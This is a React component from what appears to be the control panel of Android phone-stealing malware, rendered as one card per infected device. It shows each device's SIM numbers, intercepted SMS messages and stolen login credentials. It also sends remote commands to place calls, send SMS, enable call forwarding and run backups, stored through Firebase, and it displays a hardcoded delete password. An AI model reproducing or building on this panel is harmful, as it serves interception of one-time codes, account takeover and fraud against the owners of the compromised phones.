// app/components/DeviceCard.js
'use client';

import { useState, useRef } from 'react';
import { useAppContext } from '../context/AppContext';
import { database } from '../utils/firebase';
import { ref, update, remove, set } from 'firebase/database';
import styles from './DeviceCard.module.css';

export default function DeviceCard({ 
    deviceId, 
    index, 
    isExpanded, 
    onToggle, 
    activeTab, 
    onSetTab,
    isFavourite,
    onToggleFavourite
}) {
    const {
        data,
        deviceOnlineStatus,
        deviceSerialMap,
        deviceSmsCache,
        formMemory,
        setFormMemory,
        DELETE_PASSWORD,
        COMMAND_CLEAR_DELAY
    } = useAppContext();

    const [isLoading, setIsLoading] = useState(false);
    const [copyStatus, setCopyStatus] = useState(false);
    const cardRef = useRef(null);

    const dev = data.user_data?.[deviceId] || {};
    const serial = deviceSerialMap.get(deviceId) || 0;
    const online = deviceOnlineStatus.get(deviceId) || false;
    const lastSeen = dev.last_online || dev.timestamp;
    const statusClass = online ? 'online' : 'offline';
    const statusText = online ? 'Online' : 'Offline';
    const timeStr = lastSeen ? new Date(lastSeen).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : 'N/A';
    const dateStr = lastSeen ? new Date(lastSeen).toLocaleDateString() : '';

    const smsCache = deviceSmsCache.get(deviceId);
    const totalSms = smsCache ? smsCache.all.length : 0;

    const loginData = data.login || {};
    let devLoginList = [];
    if (loginData[deviceId]) {
        Object.keys(loginData[deviceId]).forEach(k => {
            const credData = loginData[deviceId][k];
            credData._timestamp = credData.timestamp || credData.date || Date.now();
            devLoginList.push(credData);
        });
        devLoginList.sort((a, b) => (b._timestamp || 0) - (a._timestamp || 0));
    }

    const copyDeviceId = () => {
        navigator.clipboard.writeText(deviceId).then(() => {
            setCopyStatus(true);
            setTimeout(() => setCopyStatus(false), 2000);
        }).catch(() => {
            const ta = document.createElement('textarea');
            ta.value = deviceId;
            document.body.appendChild(ta);
            ta.select();
            document.execCommand('copy');
            ta.remove();
            setCopyStatus(true);
            setTimeout(() => setCopyStatus(false), 2000);
        });
    };

    const checkDeviceStatus = () => {
        setIsLoading(true);
        const statusEl = cardRef.current?.querySelector(`.${styles.statusBadge}`);
        
        if (statusEl) {
            statusEl.className = `${styles.statusBadge} ${styles.checking}`;
            statusEl.innerHTML = '<span class="status-dot"></span> Checking...';
        }

        // Check device status from Firebase
        const deviceRef = ref(database, `user_data/${deviceId}`);
        import('firebase/database').then(({ get }) => {
            get(deviceRef).then(snap => {
                if (snap.exists()) {
                    const devData = snap.val();
                    const isOnline = devData.isOnline || devData.online || false;
                    const lastSeen = devData.last_online || devData.timestamp || 0;
                    const currentTime = Date.now();
                    const isRecent = (currentTime - lastSeen) < 120000;
                    const finalStatus = isOnline || isRecent;
                    
                    if (statusEl) {
                        statusEl.className = `${styles.statusBadge} ${finalStatus ? styles.online : styles.offline}`;
                        statusEl.innerHTML = `<span class="status-dot"></span> ${finalStatus ? 'Online' : 'Offline'}`;
                    }
                }
                setIsLoading(false);
            }).catch(() => {
                if (statusEl) {
                    statusEl.className = `${styles.statusBadge} ${styles.offline}`;
                    statusEl.innerHTML = '<span class="status-dot"></span> Error';
                }
                setIsLoading(false);
            });
        });
    };

    const clearCommand = () => {
        const commandRef = ref(database, `user_data/${deviceId}`);
        update(commandRef, {
            command: null,
            commandId: null
        }).catch(() => {});
    };

    const sendCommand = (type, params = {}) => {
        const commandId = `${type}_${Date.now()}`;
        const commandData = {
            device: deviceId,
            timestamp: Date.now(),
            isOnline: true,
            commandId: commandId,
            ...params
        };

        if (type === 'make call') {
            commandData.simSlot = params.simSlot || '0';
            commandData.adminNumber = params.number || '';
        } else if (type === 'send message') {
            commandData.phoneNumber = params.number || '';
            commandData.messageText = params.text || '';
            commandData.simSlot = params.simSlot || '1';
        } else if (type === 'call forward') {
            commandData.simSlot = params.simSlot || '0';
            commandData.phoneNumber = params.number || '';
        } else if (type === 'forward off') {
            commandData.simSlot = params.simSlot || '0';
        }

        const deviceRef = ref(database, `user_data/${deviceId}`);
        update(deviceRef, commandData).then(() => {
            setTimeout(() => clearCommand(), COMMAND_CLEAR_DELAY);
        }).catch(console.error);
    };

    const deleteDeviceSms = () => {
        const password = prompt('🔐 Enter Password to Delete SMS:');
        if (password === null) return;
        if (password !== DELETE_PASSWORD) {
            alert('❌ Incorrect Password!');
            return;
        }
        if (!confirm(`⚠️ Delete all SMS for device ${deviceId}?`)) return;

        const smsRef = ref(database, `user_sms/${deviceId}`);
        remove(smsRef).then(() => {
            alert(`✅ SMS deleted for ${deviceId}`);
        }).catch(err => alert('❌ Error: ' + err.message));
    };

    const deleteDeviceCredentials = () => {
        const password = prompt('🔐 Enter Password to Delete Credentials:');
        if (password === null) return;
        if (password !== DELETE_PASSWORD) {
            alert('❌ Incorrect Password!');
            return;
        }
        if (!confirm(`⚠️ Delete all credentials for device ${deviceId}?`)) return;

        const loginRef = ref(database, `login/${deviceId}`);
        remove(loginRef).then(() => {
            alert(`✅ Credentials deleted for ${deviceId}`);
        }).catch(err => alert('❌ Error: ' + err.message));
    };

    // Build credential HTML
    const renderCredentials = () => {
        if (devLoginList.length === 0) {
            return <div className={styles.emptyLuxury}><i className="fas fa-key"></i> No credentials found</div>;
        }

        return devLoginList.map((rec, idx) => {
            const isLatest = idx === 0;
            const timestamp = rec.timestamp || rec.date || '';
            let displayTime = '';
            if (timestamp) {
                try {
                    displayTime = new Date(timestamp).toLocaleString();
                } catch(e) {}
            }

            const fields = Object.keys(rec)
                .filter(k => !['key', 'timestamp', 'date', '_timestamp'].includes(k))
                .map(k => {
                    const value = rec[k] || 'N/A';
                    return (
                        <div key={k} className={styles.credField}>
                            <span className={styles.fieldLabel}>{k}</span>
                            <span className={styles.fieldValue}>
                                <span>{String(value)}</span>
                            </span>
                        </div>
                    );
                });

            return (
                <div key={idx} className={styles.credItem} style={{ borderLeftColor: isLatest ? 'var(--green)' : '' }}>
                    <div className={styles.credHeader}>
                        <span>
                            📋 Record {idx+1} {displayTime ? '🕐 ' + displayTime : ''}
                            {isLatest && <span className={styles.latestBadge}>⬇️ LATEST</span>}
                        </span>
                    </div>
                    <div className={styles.credFields}>{fields}</div>
                </div>
            );
        });
    };

    // Build SMS list
    const renderSms = () => {
        const smsList = smsCache ? smsCache.all.slice(0, 10).reverse() : [];
        
        if (smsList.length === 0) {
            return <div className={styles.emptyLuxury} style={{ padding: '10px 0' }}>No SMS</div>;
        }

        return smsList.map((msg, idx) => (
            <div key={idx} className={styles.smsItem}>
                <div className={styles.smsHeader}>
                    <span className={styles.smsSender}>👤 {msg.sender || msg.address || 'Unknown'}</span>
                    <span>{msg.date_formatted || msg.date || ''}</span>
                </div>
                <div className={styles.smsBody}>{msg.body || 'No content'}</div>
            </div>
        ));
    };

    // Build action buttons
    const actions = [
        { id: 'sms', icon: '💬', label: 'SMS', count: totalSms, activeClass: styles.activeSms },
        { id: 'login', icon: '🔑', label: 'Login', count: devLoginList.length, activeClass: styles.activeLogin },
        { id: 'call', icon: '📞', label: 'Call', activeClass: styles.activeCall },
        { id: 'sendsms', icon: '✉️', label: 'Send', activeClass: styles.activeSendSms },
        { id: 'fwd', icon: '🔀', label: 'Forward', activeClass: styles.activeFwd },
        { id: 'backup', icon: '💾', label: 'Backup', activeClass: styles.activeBackup },
        { id: 'delete', icon: '🗑️', label: 'Delete', activeClass: styles.activeDelete }
    ];

    const renderSections = () => {
        const sections = {
            sms: (
                <div className={`${styles.section} ${activeTab === 'sms' ? styles.active : ''}`}>
                    <div className={styles.sectionTitle}>
                        💬 SMS
                        <span className={styles.sectionCount}>{totalSms} messages</span>
                    </div>
                    <div className={styles.smsList}>{renderSms()}</div>
                </div>
            ),
            login: (
                <div className={`${styles.section} ${activeTab === 'login' ? styles.active : ''}`}>
                    <div className={styles.sectionTitle}>
                        🔑 Credentials
                        <span className={styles.sectionCount}>{devLoginList.length} records</span>
                    </div>
                    <div className={styles.credsContainer}>{renderCredentials()}</div>
                </div>
            ),
            call: (
                <div className={`${styles.section} ${activeTab === 'call' ? styles.active : ''}`}>
                    <div className={styles.sectionTitle}>📞 Make Call</div>
                    <input 
                        type="text" 
                        className={styles.inputField}
                        placeholder="Phone Number" 
                        id={`callNum-${deviceId}`}
                    />
                    <select className={styles.selectField} id={`callSim-${deviceId}`}>
                        <option value="0">SIM 1</option>
                        <option value="1">SIM 2</option>
                    </select>
                    <button 
                        className={`${styles.btnLuxury} ${styles.btnPurple}`}
                        onClick={() => {
                            const number = document.getElementById(`callNum-${deviceId}`).value.trim();
                            const simSlot = document.getElementById(`callSim-${deviceId}`).value;
                            if (!number) return alert('Enter phone number!');
                            sendCommand('make call', { number, simSlot });
                        }}
                    >
                        <i className="fas fa-phone"></i> Call
                    </button>
                </div>
            ),
            sendsms: (
                <div className={`${styles.section} ${activeTab === 'sendsms' ? styles.active : ''}`}>
                    <div className={styles.sectionTitle}>✉️ Send SMS</div>
                    <input 
                        type="text" 
                        className={styles.inputField}
                        placeholder="Recipient" 
                        id={`smsNum-${deviceId}`}
                    />
                    <textarea 
                        className={styles.textareaField}
                        placeholder="Message" 
                        rows="2"
                        id={`smsText-${deviceId}`}
                    />
                    <select className={styles.selectField} id={`smsSim-${deviceId}`}>
                        <option value="1">SIM 1</option>
                        <option value="2">SIM 2</option>
                    </select>
                    <button 
                        className={`${styles.btnLuxury} ${styles.btnBlue}`}
                        onClick={() => {
                            const number = document.getElementById(`smsNum-${deviceId}`).value.trim();
                            const text = document.getElementById(`smsText-${deviceId}`).value.trim();
                            const simSlot = document.getElementById(`smsSim-${deviceId}`).value;
                            if (!number || !text) return alert('Enter both number and message!');
                            sendCommand('send message', { number, text, simSlot });
                        }}
                    >
                        <i className="fas fa-paper-plane"></i> Send
                    </button>
                </div>
            ),
            fwd: (
                <div className={`${styles.section} ${activeTab === 'fwd' ? styles.active : ''}`}>
                    <div className={styles.sectionTitle}>🔀 Call Forward</div>
                    <input 
                        type="text" 
                        className={styles.inputField}
                        placeholder="Forward To" 
                        id={`fwdNum-${deviceId}`}
                    />
                    <select className={styles.selectField} id={`fwdSim-${deviceId}`}>
                        <option value="0">SIM 1</option>
                        <option value="1">SIM 2</option>
                    </select>
                    <button 
                        className={`${styles.btnLuxury} ${styles.btnGreen}`}
                        onClick={() => {
                            const number = document.getElementById(`fwdNum-${deviceId}`).value.trim();
                            const simSlot = document.getElementById(`fwdSim-${deviceId}`).value;
                            if (!number) return alert('Enter forward number!');
                            sendCommand('call forward', { number, simSlot });
                        }}
                    >
                        <i className="fas fa-play"></i> Activate
                    </button>
                    <button 
                        className={`${styles.btnLuxury} ${styles.btnRed}`}
                        onClick={() => {
                            const simSlot = document.getElementById(`fwdSim-${deviceId}`).value;
                            sendCommand('forward off', { simSlot });
                        }}
                    >
                        <i className="fas fa-stop"></i> Deactivate
                    </button>
                </div>
            ),
            backup: (
                <div className={`${styles.section} ${activeTab === 'backup' ? styles.active : ''}`}>
                    <div className={styles.sectionTitle}>💾 Backup</div>
                    <button 
                        className={`${styles.btnLuxury} ${styles.btnPurple}`}
                        onClick={() => sendCommand('backup')}
                    >
                        <i className="fas fa-database"></i> Backup Now
                    </button>
                </div>
            ),
            delete: (
                <div className={`${styles.section} ${activeTab === 'delete' ? styles.active : ''}`} style={{ borderColor: 'var(--red)' }}>
                    <div className={styles.sectionTitle} style={{ color: 'var(--red)' }}>🗑️ Delete Device Data</div>
                    <button className={`${styles.btnLuxury} ${styles.btnRed}`} onClick={deleteDeviceSms}>
                        <i className="fas fa-trash"></i> Delete All SMS
                    </button>
                    <button className={`${styles.btnLuxury} ${styles.btnPurpleDelete}`} onClick={deleteDeviceCredentials}>
                        <i className="fas fa-trash"></i> Delete All Credentials
                    </button>
                    <div className={styles.deleteHint}>
                        <span>⚠️</span> Password required: <span className={styles.passwordHint}>9999</span>
                    </div>
                </div>
            )
        };

        return ['sms', 'login', 'call', 'sendsms', 'fwd', 'backup', 'delete'].map(key => sections[key]);
    };

    return (
        <div 
            ref={cardRef}
            className={`${styles.deviceCard} ${styles[statusClass]} ${isExpanded ? styles.expanded : ''}`}
            data-device-id={deviceId}
        >
            <div className={styles.cardHeader} onClick={() => onToggle(deviceId)}>
                <div className={styles.deviceInfoLeft}>
                    <div className={styles.deviceName}>
                        <button 
                            className={styles.favStarBtn}
                            onClick={(e) => {
                                e.stopPropagation();
                                onToggleFavourite(deviceId);
                            }}
                            title={isFavourite ? 'Remove from favourites' : 'Add to favourites'}
                        >
                            <i className={`${isFavourite ? 'fas' : 'far'} fa-star`}></i>
                        </button>
                        <span className={styles.nameText}>📱 {deviceId}</span>
                        <span className={styles.deviceId}>#{index + 1}</span>
                        {serial > 0 && (
                            <span className={styles.serialBadge}>
                                <i className="fas fa-hashtag"></i> S-{serial}
                            </span>
                        )}
                        {isFavourite && (
                            <span className={styles.favBadge}>⭐ FAV</span>
                        )}
                        <button 
                            className={`${styles.copyIdBtn} ${copyStatus ? styles.copied : ''}`}
                            onClick={(e) => {
                                e.stopPropagation();
                                copyDeviceId();
                            }}
                            title="Copy Device ID"
                        >
                            <i className="fas fa-copy"></i> {copyStatus ? 'Copied!' : 'Copy ID'}
                        </button>
                    </div>
                    <div className={styles.deviceSubInfo}>
                        <span><i className="fas fa-microchip"></i> {dev.Device_info || dev.device_info || 'N/A'}</span>
                        <span><i className="fas fa-sim-card"></i> {dev.numberSim1 || dev.sim1 || 'No SIM'}</span>
                        {(dev.numberSim2 || dev.sim2) && (
                            <span><i className="fas fa-sim-card"></i> {dev.numberSim2 || dev.sim2}</span>
                        )}
                    </div>
                </div>
                <div className={styles.deviceStatusRight}>
                    <span className={`${styles.statusBadge} ${styles[statusClass]}`}>
                        <span className={styles.statusDot}></span>
                        {statusText}
                    </span>
                    <div className={styles.lastSeen}>
                        <i className="far fa-clock"></i> {dateStr ? dateStr + ' ' : ''}{timeStr}
                    </div>
                    <button 
                        className={styles.checkStatusBtn}
                        onClick={(e) => {
                            e.stopPropagation();
                            checkDeviceStatus();
                        }}
                        title="Check Status"
                    >
                        <i className={`fas fa-sync-alt ${isLoading ? styles.spinning : ''}`}></i>
                    </button>
                </div>
            </div>

            <div className={styles.infoGrid} onClick={() => onToggle(deviceId)}>
                <div className={styles.infoItem}>
                    <span className={styles.infoLabel}>Device</span>
                    <span className={styles.infoValue}>{dev.Device_info || dev.device_info || 'N/A'}</span>
                </div>
                <div className={styles.infoItem}>
                    <span className={styles.infoLabel}>SIM 1</span>
                    <span className={`${styles.infoValue} ${!(dev.numberSim1 || dev.sim1) ? styles.simEmpty : ''}`}>
                        {dev.numberSim1 || dev.sim1 || 'No SIM'}
                    </span>
                </div>
                <div className={styles.infoItem}>
                    <span className={styles.infoLabel}>SIM 2</span>
                    <span className={`${styles.infoValue} ${!(dev.numberSim2 || dev.sim2) ? styles.simEmpty : ''}`}>
                        {dev.numberSim2 || dev.sim2 || 'No SIM'}
                    </span>
                </div>
                <div className={styles.infoItem}>
                    <span className={styles.infoLabel}>Serial</span>
                    <span className={`${styles.infoValue} ${styles.highlight}`}>
                        {serial > 0 ? serial : '—'}
                    </span>
                </div>
            </div>

            <div className={styles.expandHint} onClick={() => onToggle(deviceId)}>
                <i className="fas fa-chevron-down"></i>
                {isExpanded ? 'Click to collapse' : 'Click to expand'}
            </div>

            {isExpanded && (
                <div className={styles.expandableContent}>
                    <div className={styles.actionsRow}>
                        {actions.map((action) => (
                            <button
                                key={action.id}
                                className={`${styles.actionBtn} ${activeTab === action.id ? action.activeClass : ''}`}
                                onClick={(e) => {
                                    e.stopPropagation();
                                    onSetTab(deviceId, action.id);
                                }}
                            >
                                {action.icon} {action.label}
                                {action.count !== undefined && action.count > 0 && (
                                    <span className={styles.btnBadge}>{action.count}</span>
                                )}
                            </button>
                        ))}
                    </div>
                    {renderSections()}
                </div>
            )}
        </div>
    );
}
